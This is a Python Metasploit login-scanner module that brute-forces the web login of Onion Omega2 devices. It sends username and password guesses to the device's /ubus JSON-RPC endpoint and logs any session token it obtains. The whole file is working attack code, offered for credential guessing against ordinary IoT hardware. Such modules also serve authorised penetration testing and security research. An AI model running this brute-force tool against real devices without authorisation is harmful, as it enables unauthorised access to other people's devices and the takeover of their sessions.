#!/usr/bin/env python3
# 2019-03-27 05-55

# Standard Modules
from metasploit import module, login_scanner
import json

# Extra Modules
dependencies_missing = False
try:
    import requests
except ImportError:
    dependencies_missing = True

# Metasploit Metadata
metadata = {
    'name': 'Onion Omega2 Login Brute-Force',
    'description': '''
        OnionOS login scanner module for Onion Omega2 devices.
    ''',
    'authors': [
        'Not So Attractive <github.com/nsa>'
    ],
    'date': '2019-03-27',
    'license': 'MSF_LICENSE',
    'references': [
    ],
    'type': 'single_host_login_scanner',
    'options': {
        'rhost': {'type': 'address', 'description': 'Host to target', 'required': True},
        'rport': {'type': 'port', 'description': 'Port to target', 'required': True, 'default': '80'},
        'userpass': {'type': 'string', 'description': 'A list of username/password combinations to try',
                     'required': False},
        'sleep_interval': {'type': 'float', 'description': 'Time in seconds to wait between login attempts',
                           'required': False}
    },
    'service_name': 'Onion Omega2 HTTPd Ubus',
}


def valid_login(host, rport, username, password):
    payload = {
        "jsonrpc": "2.0", "id": 0, "method": "call", "params": ["0" * 32, "session", "login",
                                                                {
                                                                    "username": username,
                                                                    "password": password
                                                                }]}
    url = 'http://' + str(host) + ':' + str(rport) + '/ubus'
    session = requests.Session()
    try:
        request = session.post(url, json=payload)
        response = json.loads(request.text)
        if response['result'][0] != 6 and len(response['result']) > 1:
            ubus_rpc_session = response['result'][1]['ubus_rpc_session']
            module.log('Ubus RPC Session: ' + ubus_rpc_session, level='good')
        else:
            return False
    except requests.exceptions.ConnectionError:
        module.log("Unhandled exception: ConnectionError", level='error')
        return False
    except ValueError:
        module.log("Unhandled exception: Response JSON DecodeError", level='error')
        return False
    except KeyError:
        module.log("Unhandled exception: Dictionary KerError in Response", level='error')
        return False
    else:
        return True


def run(args):
    if dependencies_missing:
        module.log('Python requests module missing, cannot continue', level='error')
        return
    scanner = login_scanner.make_scanner(
        lambda host, rport, username, password: valid_login(host, rport, username, password))
    scanner(args)


if __name__ == '__main__':
    module.run(metadata, run)
